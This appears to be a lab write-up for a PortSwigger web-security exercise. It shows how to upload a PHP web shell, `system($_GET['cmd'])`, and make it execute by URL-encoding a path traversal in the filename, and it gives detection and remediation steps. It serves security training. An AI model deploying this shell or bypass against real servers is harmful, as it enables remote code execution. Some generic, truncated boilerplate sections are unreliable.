# Web shell upload via path traversal

### Goal - 

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`



### Vulnerability / Concept

This lab demonstrates a vulnerability in the file upload category.

This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.

The vulnerability exists because the application fails to properly validate, sanitize, or secure the user-controlled input that reaches a sensitive operation. The specific attack surface and exploitation technique depend on the exact vulnerability type demonstrated in this lab.

### Recon / Initial Analysis

Based on the lab's objective and the PortSwigger solution:

1. Analyze the application's functionality to identify the attack surface
2. Log in and upload an image as your avatar, then go back to your account page.
                    
                    
                        In Burp, go to Proxy &gt; HTTP history and notice that y
3. Use Burp Suite Proxy to intercept and analyze requests
4. Identify the specific vulnerability type by testing user-controlled input
5. Determine the appropriate exploitation technique for this lab

### Analysis/Exploitation -

Login as user `wiener`:

In the account settings, I can set both an email address and an avatar image for the user.

upload the PHP script  
`<?php system($_GET['cmd']); ?>`

When we clicked the `Upload` button, it’ll send a POST request to `/my-account/avatar`, with parameter `filename`, `user` and `csrf`. Also, the `Content-Type` is `application/x-php`.

![](./images/b096c479528a_001.png)

when we click “Back to My Account”, notice that file was fetched using a `GET` request to `/files/avatars/<filename>`. So the uploaded file will located in `/files/avatars/<filename>`.

![](./images/b096c479528a_002.png)

![](./images/b096c479528a_003.png)

Uploading the php file is successful. However, accessing this file just shows the content of the file. The PHP code is not executed on the server side:

{% hint style="info" %}
💡 This behavior is potentially interesting in its own right, as it may provide a way to leak source code, but it nullifies any attempt to create a web shell.

This kind of configuration often differs between directories. A directory to which user-supplied files are uploaded will likely have much stricter controls than other locations on the filesystem that are assumed to be out of reach for end users. If you can find a way to upload a script to a different directory that's not supposed to contain user-supplied files, the server may execute your script after all.

{% endhint %}


**Modify the file path**

The definition of what files are executed is often done per directory. The `/files/avatar/` path appears not to execute PHP scripts. The next step is to try and escape the path into a location that executes PHP.

Change the filename to `../shell.php` to try to store the file on dictionary up. The upload confirmation shows the same path `avatar/` as the previous upload, so the path traversal did not succeed:

![](./images/b096c479528a_004.png)

Either some or all of the characters of the path traversal are stripped away, or the application is not vulnerable to this type of attack (but the lab name gives a hint that path traversal possible so find  a way for it).

My first attempt to circumvent the protection is to obfuscate the path traversal with URL-encoding the `../` part:

![](./images/b096c479528a_005.png)

accessing file with directory traversal gives error

![](./images/b096c479528a_006.png)

if we move up a directory and directly access the file then php get executed

![](./images/b096c479528a_007.png)

The response indicates that the path traversal was successful. Accessing the path calls the file outside of the avatar directory and executes the PHP on the server, providing the secret string (calling `/files/webShell.php` shows the same)

![](./images/b096c479528a_008.png)

### Why It Works

The vulnerability exists because the application processes user-controlled input without adequate security validation. In this specific lab, the attack succeeds because:

- The application trusts the user input without proper server-side validation
- The input reaches a sensitive operation (database query, HTML rendering, system command, etc.) without sanitization
- The security boundary that should protect the operation is missing or incorrectly implemented
- The specific payload used exploits the exact weakness in the application's input handling

The PortSwigger lab description confirms this: "This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability"

### Attack Flow

**Attack Flow:**

```
Attacker Input (payload in request)
        ↓
Application Functionality (processes user input)
        ↓
Server Processing (no validation/sanitization)
        ↓
Injection Point (input reaches sensitive operation)
        ↓
Exploitation (payload executes as intended)
        ↓
Lab Objective Achieved
```

### Real-World Impact

An attacker could achieve remote code execution (RCE) by uploading a web shell, access files on the server, overwrite critical files, or cause denial of service by uploading large files.

### Detection / Testing Methodology

1. Identify file upload functionality (avatars, documents, attachments)
2. Test which file types are accepted (Content-Type, extension)
3. Check if file content is validated (magic bytes)
4. Determine where uploaded files are stored (web-accessible?)
5. Test for path traversal in the filename
6. Test for race conditions in the upload-verify-delete cycle
7. Check if double extensions or null bytes bypass filters

### Remediation

- Validate file content, not just headers (check magic bytes)
- Store uploaded files outside the web root
- Disable script execution in upload directories
- Use random filenames without preserving extensions
- Validate file type using server-side content analysis
- Implement size limits and rate limiting

### Key Takeaways

- This lab demonstrates a file upload vulnerability in a real-world scenario.
- The vulnerability occurs because user input reaches a sensitive operation without proper validation.
- The PortSwigger lab confirms: "This lab contains a vulnerable image upload function. The server is configured to prevent execution "
- Burp Suite is essential for identifying and exploiting this vulnerability.
- The remediation for this specific vulnerability involves: - Validate file content, not just headers (check magic bytes)
